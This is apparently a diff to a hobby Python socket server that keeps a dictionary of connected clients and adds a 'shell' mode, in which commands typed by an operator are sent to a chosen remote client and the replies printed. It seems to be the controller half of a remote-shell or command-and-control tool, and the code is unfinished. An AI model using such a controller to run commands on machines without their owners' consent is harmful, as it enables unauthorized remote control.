@@ -32,6 +32,8 @@ class s_sock:
         
         self.server.listen()  
         
+        clients = {}
+        
         ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
         while True:
             self.conn, addr = self.server.accept()
@@ -44,7 +46,20 @@ class s_sock:
             ## Creating the name in format of '127_0_0_1_QWERT' aka 'IP_ID'
             
             client_name = "client_" + ip_address.replace(".", "_") + "_" + id
+            
+            ## creating object intance
             client = s_perclient()
+
+            # something dict
+            clients[client_name] = client
+            
+            ''' THis is what the dict looks like, each "name" is pointing at a class object
+            clients = {
+                "client_192_168_0_1_1": <s_perclient object at 0x7fda883e4c70>,
+                "client_192_168_0_2_1": <s_perclient object at 0x7fda883e4d00>,
+                "client_192_168_0_2_2": <s_perclient object at 0x7fda883e4d90>
+            }
+            '''
 
             globals()[client_name] = client
             thread = threading.Thread(target=client.handle_client, args=(self.conn, self.ADDR))
@@ -58,32 +73,61 @@ class s_sock:
                     print(var_name)
             print("===============================\n\n")
             
-            ## for interacting with each client, :
-            #client = client_127_0_0_1_QWERT
-            #client.handle_client()
+        
+            ## Interacting with client (temporarily here)
+            ## dict 
+            client_name = input("Enter a client name: ")
+
+            # get the corresponding instance from the clients dictionary and call its method
+            if client_name in clients:
+                client_instance = clients[client_name]
+                client_instance.client_do()
+            else:
+                print(f"{client_name} not found.")
             
-            ## Would need to show current clients to the user, then set whatever one they choose to "client". 
-            ## With error handling of course. 
             
-            ## ex:
-            ## Def interact():
-            ##  clinet = None (clears client just in case)
-            ##  client = user_input()
-            ##  if clinet not in clinet_list:
-            ##    print("err not a valid eclinet")
-            ## else:
-            ## client.interact() ## creating an interact method in the class, or just use handle_client (might need a re-think of the logic)
-    
+            
+            #self.client_interact()
+            
+    def client_interact(self):
+        print("\n\n========Current Clients========")
+        for var_name in globals():
+            if var_name.startswith("client_"):
+                print(var_name)
+        print("===============================\n\n")
+        
+        
+        ## dict 
+        client_name = input("Enter a client name: ")
+
+        # get the corresponding instance from the clients dictionary and call its method
+        if client_name in clients:
+            client_instance = clients[client_name]
+            client_instance.client_do()
+        else:
+            print(f"{client_name} not found.")
     
     ##########
     ## In Sub Thread
     ##########
+    
+    ## Needs a rework, including seperating handle_client to just hanlde the connection, and 
+    ## A  proper cliet_do tree. Rely on the instance to hold data when not using (aka self) instead
+    ## of passing commands into decisions tree like handle client currenlty is
+    
+    ##TLDR: handle_client only handles client connections, call client_do for actually performing client actions
+    
 class s_perclient:
     
     ## Each thread runs this, which will handle the client appropriatly.
     def handle_client(self, conn, addr):
         self.conn = conn
         self.addr = addr
+        ## redundant of self.addr but easier to use
+        self.ip = addr[0]
+        self.port = addr[1]
+        
+        print(self.conn, self.addr)
         
         
         print(f"New Connection from {conn.getpeername()}")
@@ -116,9 +160,11 @@ class s_perclient:
         
     
     def client_do(self):
+        print(f"CLIENT_DO {type(self).__name__}")
         
         ## Current job will be whatever the user wants to do... needs some thinking out on how to execute
-        current_job = "wait"
+        #current_job = "wait"
+        current_job = "shell"
         
         if current_job == "wait":
             self.send_msg("wait")
@@ -127,7 +173,7 @@ class s_perclient:
         elif current_job == "shell":
             while True:
                 shellcommand = input("$: ") ## eventually this unput will be from a different connection (from logec client) for now its local
-                self.send_msg(shellcommand)
+                print(self.send_msg(shellcommand))
         
         
     
@@ -138,6 +184,9 @@ class s_perclient:
         print(f"Message being sent: {message}")
         #print("waiting on recieve message")
         
+        recieve_msg = self.conn.recv(1024).decode()
+        
+        return recieve_msg
         '''recieve_msg = self.conn.recv(1024).decode() ## was 10000
         
         if recieve_msg == None:
@@ -221,7 +270,8 @@ class s_action:
 if __name__ == "__main__":
     ## could listen on multiple ports with threading this whole thing
     SERV = s_sock()
-    SERV.start_server('0.0.0.0',8091)
+    SERV.start_server('0.0.0.0',8092)
+   #SERV.client_interact()
     #while True:
     
     '''while True:
